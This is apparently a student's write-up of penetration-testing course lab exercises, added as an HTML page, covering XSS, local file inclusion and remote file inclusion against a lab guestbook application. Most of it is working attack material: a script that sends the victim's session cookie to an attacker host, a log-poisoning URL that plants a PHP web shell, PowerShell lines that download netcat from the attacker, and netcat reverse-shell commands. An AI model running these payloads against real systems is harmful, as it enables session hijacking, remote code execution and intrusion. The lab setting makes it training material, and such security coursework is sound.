@@ -1,0 +1,64 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Exercises-13.2.3-13.3.2.1-XSS, LFI, RFI Attacks</title>
+</head><body>13.2.3 - Exercises<br/>
+1. Exploit the XSS vulnerability in the guestbook application to get the admin<br/>
+cookie and hijack the session. The admin user is ‘offsec’ with password ‘123456’.<br/>
+2. Consider what other ways an XSS here might be able to be used for attacks.<br/>
+3. Does this exploit attack the server or clients of the site?<br/>
+<br/>
+1.<br/>
+Code to steal the cookie:<br/>
+&lt;script&gt;<br/>
+new Image().src="http://10.11.0.187:81/bogus.php?output="+document.cookie;<br/>
+&lt;/script&gt;<br/>
+<br/>
+Session ID captured and session hijacked:<br/>
+<img src="screenshot.png" /><br/>
+<br/>
+<br/>
+2. A XSS here might be able to be used for stealing credit card information or on pages that contain PII.<br/>
+<br/>
+3. This exploit attacks the clients of the site--not the servers.<br/>
+<br/>
+13.3.1.3 - Exercises<br/>
+1. Obtain code execution through the use of the LFI attack.<br/>
+2. Using what you learned on file transfers, use the code execution to obtain a full<br/>
+shell.<br/>
+<br/>
+1.<br/>
+Server IP configuration obtained thorugh example LFI attack:<br/>
+<img src="screenshot 2.png" /><br/>
+<br/>
+<img src="screenshot 3.png" /><br/>
+<br/>
+2.<br/>
+http://10.11.10.124/addguestbook.php?name=Hacker&amp;comment=words&amp;cmd=C:\xampp\htdocs\nc.exe%20-nv%2010.11.0.187%20443%20-e%20cmd.exe&amp;LANG=../../../../../../../xampp/apache/logs/access.log%00&amp;Submit=Submit<br/>
+<br/>
+On Kali:<br/>
+nc -nv 10.11.10.124 80<br/>
+&lt;?php echo shell_exec($_GET['cmd']);?&gt;<br/>
+<br/>
+Then entered one of the below commands and repeated the sequence:<br/>
+echo $storageDir = $pwd &gt; wget.ps1<br/>
+echo $webclient = New-Object System.Net.WebClient &gt;&gt;wget.ps1<br/>
+echo $url = "http://10.11.0.187/nc.exe" &gt;&gt;wget.ps1<br/>
+echo $file = "nc.exe" &gt;&gt;wget.ps1<br/>
+echo $webclient.DownloadFile($url,$file) &gt;&gt;wget.ps1<br/>
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1<br/>
+C:\xampp\htdocs\nc.exe -nv 10.11.0.187 443 -e cmd.exe<br/>
+<br/>
+Reverse shell obtained:<br/>
+<img src="screenshot 4.png" /><br/>
+<br/>
+13.3.2.1 - Exercise<br/>
+1. Exploit the RFI vulnerability in the web application and get your shell.<br/>
+Place this command in a txt file and enter the url for the file in the browser.<br/>
+<b>&lt;?php echo shell_exec("nc.exe -nv 10.11.0.187 443 -e cmd.exe");?&gt;</b><br/>
+<br/>
+<b>http://10.11.10.124/addguestbook.php?name=Hacker&amp;comment=words&amp;LANG=http://10.11.0.187/evil.txt%00&amp;Submit=Submit</b><br/>
+<br/>
+<img src="screenshot 5.png" /><br/>
+</body></html>
